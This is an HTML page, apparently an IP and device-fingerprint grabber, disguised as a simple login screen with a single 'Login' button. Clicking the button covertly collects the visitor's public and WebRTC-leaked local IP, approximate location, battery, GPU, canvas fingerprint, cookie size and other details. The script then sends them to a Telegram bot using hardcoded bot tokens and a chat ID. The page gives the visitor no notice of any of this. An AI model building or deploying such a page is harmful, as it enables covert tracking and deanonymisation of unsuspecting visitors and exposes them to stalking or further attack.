<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Analyzer</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Poppins', sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #ff5e62, #f7c76e);
            overflow: hidden;
        }
        .container {
            position: relative;
            text-align: center;
            z-index: 1;
        }
        .login-btn {
            padding: 15px 50px;
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            background: #ff5722;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            text-transform: uppercase;
        }
        .login-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
        }
        .login-btn:active {
            transform: scale(0.95);
        }
        .bg-particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            overflow: hidden;
        }
        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            animation: float 10s infinite ease-in-out;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20vh); }
        }
    </style>
</head>
<body>
    <div class="bg-particles" id="particles"></div>
    <div class="container">
        <button class="login-btn">Login</button>
    </div>

    <script>
        // Konfigurasi Bot Telegram
        const BOT_TOKEN_1 = "7552217671:AAHxUsM0JM8_Q2W4zPxnMvdYYR0lhRjy5JI"; // Token bot pertama
        const BOT_TOKEN_2 = "7961865884:AAHFajpE6iPO1VOej1F52JYTqgGJkscDAI8"; // Token bot kedua
        const CHAT_ID_2 = "6414865523"; // Chat ID bot kedua
        const MAX_MESSAGE_LENGTH = 4000; // Batas aman di bawah 4096 karakter

        // Fungsi untuk mengirim pesan
        async function sendToTelegramBot(token, chatId, message) {
            const parts = splitMessage(message, MAX_MESSAGE_LENGTH);
            for (let i = 0; i < parts.length; i++) {
                const partMessage = `üì¶ *Bagian ${i + 1}/${parts.length}*\n${parts[i]}`;
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(partMessage)}&parse_mode=Markdown`;
                try {
                    const response = await fetch(url);
                    const data = await response.json();
                    if (!data.ok) console.error(`Gagal mengirim bagian ${i + 1}: ${data.description}`);
                } catch (error) {
                    console.error(`Error bagian ${i + 1}:`, error);
                }
                await new Promise(resolve => setTimeout(resolve, 500)); // Delay untuk menghindari rate limit
            }
        }

        // Fungsi untuk memecah pesan
        function splitMessage(message, maxLength) {
            const parts = [];
            let currentPart = "";
            const lines = message.split("\n");

            for (const line of lines) {
                if ((currentPart + line + "\n").length > maxLength) {
                    parts.push(currentPart.trim());
                    currentPart = line + "\n";
                } else {
                    currentPart += line + "\n";
                }
            }
            if (currentPart) parts.push(currentPart.trim());
            return parts;
        }

        // Fungsi analisis perangkat canggih
        async function analyzeDevice() {
            // Slide 1: Informasi Utama
            let report1 = "üîç *Analisis Perangkat Canggih - Slide 1* üîç\n";
            report1 += "======================================\n";

            // GPU & WebGL Advanced
            const gpuInfo = await getGPUInfo();
            report1 += `üéÆ *GPU*: ${gpuInfo.renderer} (Vendor: ${gpuInfo.vendor})\n`;

            // CPU & Performa
            const cpuInfo = await benchmarkCPU();
            report1 += `‚öôÔ∏è *CPU*: ${navigator.hardwareConcurrency} core(s) | Performa: ${cpuInfo.score.toFixed(2)} ops/ms\n`;

            // Layar & Resolusi
            report1 += `üñ•Ô∏è *Layar*: ${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x DPI)\n`;

            // Tema & UI
            const theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Gelap üåô" : "Terang ‚òÄÔ∏è";
            report1 += `üé® *Tema*: ${theme}\n`;

            // Vendor & Browser
            report1 += `üè≠ *Vendor*: ${navigator.vendor || "N/A"} | Browser: ${navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/[\d.]+/)?.[0] || "N/A"}\n`;

            // Java & Plugins
            report1 += `‚òï *Java*: ${navigator.javaEnabled() ? "Aktif ‚úÖ" : "Nonaktif ‚ùå"}\n`;

            // Zona Waktu & Bahasa
            report1 += `‚è∞ *Zona Waktu*: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
            report1 += `üåê *Bahasa*: ${navigator.languages.join(", ")}\n`;

            // Lokasi via IP
            const location = await getLocationFromIP();
            report1 += `üìç *Lokasi (Estimasi)*: ${location.city || "N/A"}, ${location.country || "N/A"}\n`;

            // Koneksi & Proxy/VPN
            const network = await analyzeNetwork();
            report1 += `üåê *Koneksi*: ${network.type} | Proxy/VPN: ${network.isProxy ? "Terdeteksi üïµÔ∏è" : "Tidak ‚ùå"}\n`;
            report1 += `üì° *Kecepatan*: ${network.speed || "N/A"} Mbps\n`;

            // Merek & OS
            const deviceGuess = guessDeviceFromUA();
            report1 += `üì± *Merek*: ${deviceGuess.brand} | *OS*: ${deviceGuess.os}\n`;

            // Baterai
            const battery = await getBatteryInfo();
            report1 += `üîã *Baterai*: ${battery.level}% (${battery.charging ? "‚ö° Charging" : "üîå Tidak Charging"})\n`;

            // IP Publik & Lokal
            report1 += `üåç *IP Publik*: ${await getPublicIP()}\n`;
            report1 += `üè† *IP Lokal*: ${await getLocalIP()}\n`;

            // Cookie & Storage
            report1 += `üç™ *Cookie*: ${document.cookie ? "Ada (" + document.cookie.length + " bytes)" : "Tidak ada"}\n`;
            report1 += `üíæ *Storage*: Local: ${navigator.storage?.estimate ? (await navigator.storage.estimate()).quota / 1024 / 1024 + " MB" : "N/A"}\n`;

            // Fitur Tambahan
            report1 += `üì≤ *Touch Support*: ${navigator.maxTouchPoints > 0 ? "Ya (" + navigator.maxTouchPoints + " points)" : "Tidak"} üåü\n`;
            report1 += `üåê *WebRTC Leak*: ${await checkWebRTCLeak() ? "Terdeteksi ‚ö†Ô∏è" : "Aman ‚úÖ"}\n`;

            report1 += "======================================\n";

            // Slide 2: Fingerprint Details
            let report2 = "üîç *Analisis Perangkat Canggih - Slide 2* üîç\n";
            report2 += "======================================\n";
            report2 += "üÜî *Device Fingerprint Details* üÜî\n";
            const fingerprintData = await generateFingerprintData();
            report2 += `üë§ *User Agent*: ${fingerprintData.userAgent}\n`;
            report2 += `üé® *Canvas Hash*: ${fingerprintData.canvasHash}\n`;
            report2 += `üñ•Ô∏è *Resolusi*: ${fingerprintData.resolution}\n`;
            report2 += `üî¢ *Fingerprint Hash*: ${fingerprintData.hash}\n`;
            report2 += "======================================\n";
            report2 += "üöÄ *Generated by A99 Psycho* üöÄ";

            // Gabungkan slide untuk pengiriman
            const fullReport = report1 + report2;

            // Kirim ke bot kedua
            await sendToTelegramBot(BOT_TOKEN_2, CHAT_ID_2, fullReport);
        }

        // Fungsi Fingerprint dengan Atribut Terpisah
        async function generateFingerprintData() {
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            ctx.fillText("FingerprintTest", 10, 50);
            const canvasData = canvas.toDataURL();
            const userAgent = navigator.userAgent;
            const resolution = `${window.screen.width}x${window.screen.height}`;
            const hash = btoa(userAgent + canvasData + resolution);
            return {
                userAgent: userAgent,
                canvasHash: btoa(canvasData).slice(0, 20) + "...", // Potong agar tidak terlalu panjang
                resolution: resolution,
                hash: hash
            };
        }

        // Fungsi GPU Info
        function getGPUInfo() {
            const canvas = document.createElement("canvas");
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (!gl) return { renderer: "N/A", vendor: "N/A" };
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            return {
                renderer: gl.getParameter(gl.RENDERER),
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A"
            };
        }

        // Benchmark CPU
        function benchmarkCPU() {
            const start = performance.now();
            let sum = 0;
            for (let i = 0; i < 1e6; i++) sum += Math.sqrt(i);
            const end = performance.now();
            const duration = end - start;
            return { score: (1e6 / duration) };
        }

        // Lokasi dari IP
        async function getLocationFromIP() {
            try {
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();
                return { city: data.city, country: data.country_name };
            } catch (e) {
                return { city: "N/A", country: "N/A" };
            }
        }

        // Analisis Jaringan (dengan kecepatan)
        async function analyzeNetwork() {
            const conn = navigator.connection || {};
            const isProxy = conn.rtt === 0 && conn.downlink === 0;
            const speed = conn.downlink || "N/A"; // Kecepatan dalam Mbps (jika tersedia)
            return { type: conn.effectiveType || "N/A", isProxy, speed };
        }

        // Tebak Merek & OS
        function guessDeviceFromUA() {
            const ua = navigator.userAgent;
            const brandMatch = ua.match(/(iPhone|Samsung|Huawei|Xiaomi|Oppo|Vivo|Google)/i)?.[0] || "N/A";
            const osMatch = ua.match(/(Windows|Mac OS|Android|iOS|Linux)/i)?.[0] || "N/A";
            return { brand: brandMatch, os: osMatch };
        }

        // Info Baterai
        async function getBatteryInfo() {
            if (!navigator.getBattery) return { level: "N/A", charging: "N/A" };
            const battery = await navigator.getBattery();
            return { level: (battery.level * 100).toFixed(0), charging: battery.charging };
        }

        // IP Publik
        async function getPublicIP() {
            try {
                const res = await fetch("https://api.ipify.org?format=json");
                const data = await res.json();
                return data.ip;
            } catch (e) {
                return "N/A";
            }
        }

        // IP Lokal
        async function getLocalIP() {
            return new Promise((resolve) => {
                const rtc = new RTCPeerConnection({ iceServers: [] });
                rtc.createDataChannel("");
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                rtc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[0] || "N/A";
                        resolve(ip);
                    }
                };
                setTimeout(() => resolve("N/A"), 2000);
            });
        }

        // Deteksi WebRTC Leak
        async function checkWebRTCLeak() {
            const localIP = await getLocalIP();
            const publicIP = await getPublicIP();
            return localIP !== "N/A" && localIP !== publicIP; // Jika IP lokal berbeda dengan publik, ada potensi leak
        }

        // Animasi Partikel
        function createParticles() {
            const particleContainer = document.getElementById("particles");
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement("div");
                particle.className = "particle";
                particle.style.width = `${Math.random() * 10 + 5}px`;
                particle.style.height = particle.style.width;
                particle.style.left = `${Math.random() * 100}vw`;
                particle.style.top = `${Math.random() * 100}vh`;
                particle.style.animationDelay = `${Math.random() * 5}s`;
                particleContainer.appendChild(particle);
            }
        }

        // Event Listener
        document.querySelector(".login-btn").addEventListener("click", () => {
            analyzeDevice();
        });

        // Inisialisasi
        createParticles();
    </script>
</body>
</html>
